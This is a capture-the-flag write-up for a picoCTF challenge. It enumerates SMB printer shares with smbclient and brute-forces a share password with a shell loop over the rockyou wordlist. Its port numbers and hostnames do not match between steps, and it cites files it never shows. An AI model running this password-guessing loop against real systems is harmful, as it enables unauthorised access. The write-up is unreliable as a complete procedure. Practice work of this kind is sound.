Printer Shares 2

Name: Printer Shares 2
Description: A Secure Printer is now in use. I'm confident no one can leak the message again... or can you? two printers are on 61850, one private, one public. you can try $ nc -vz green-hill.picoctf.net 61850
Author: Janice He
Tags: Hard, General Skills, picoCTF 2026
Challenge from: picoCTF 2026
Hints:
1. default password is dangerous, isn't it?
2. can you find a potential user? What is the username?
3. the wordlist, rockyou.txt, is pretty common for password cracking

Theory

According to the description, to get the flag we need to connect to a printer and get a file that the printer holds. We are given a NetCat command that will check if the printer on the port is up and running, but it'll actually not give us any extra info, instead to view files from the printer we'll have to look at the users the printer has, it should be named something like disk or share since shares is the codename for users on this environment, so we can get access to the files of the printer. So to search the actual users we need a command like this, using smbclient with the option -L to list the shares on the port the printer is in, and use the -N option so that it doesn't ask for our password each time we do this command:

smbclient -L mysterious-sea.picoctf.net -p 52848 -N

Solution

We can check the printer is alive and then the usual command from theory:

shukularuni@SHUKULAP:~$ nc -vz green-hill.picoctf.net 61850
Connection to green-hill.picoctf.net (3.18.205.4) 61850 port [tcp/*] succeeded!

shukularuni@SHUKULAP:~$ smbclient -L green-hill.picoctf.net -p 61850 -N

        Sharename       Type      Comment
        ---------       ----      -------
        shares          Disk      Public Share With Guests
        secure-shares   Disk      Printer for internal usage only
        IPC$            IPC       IPC Service (Samba 4.19.5-Ubuntu)
SMB1 disabled -- no workgroup available

It seems content and kafka are just big blocks of text to waste our time, but notification has something interesting, secure-shares has a weak password, and since these systems usually don't have protection against multiple password bruteforce attacks, I think we can just send rockyou passwords until we get something. So for that we can use this command, which will go through the rockyou list until it doesn't fail, and don't forget to add the user "joe" that we got from the notification file, we can leave this running until we get the password:

shukularuni@SHUKULAP:~$ while read p; do echo "TRY: $p"; smbclient //green-hill.picoctf.net/secure-shares -p 62567 -U joe%"$p" -c "ls" && echo "HALLO-ALLE: $p" && break; done < /usr/share/wordlists/rockyou.txt
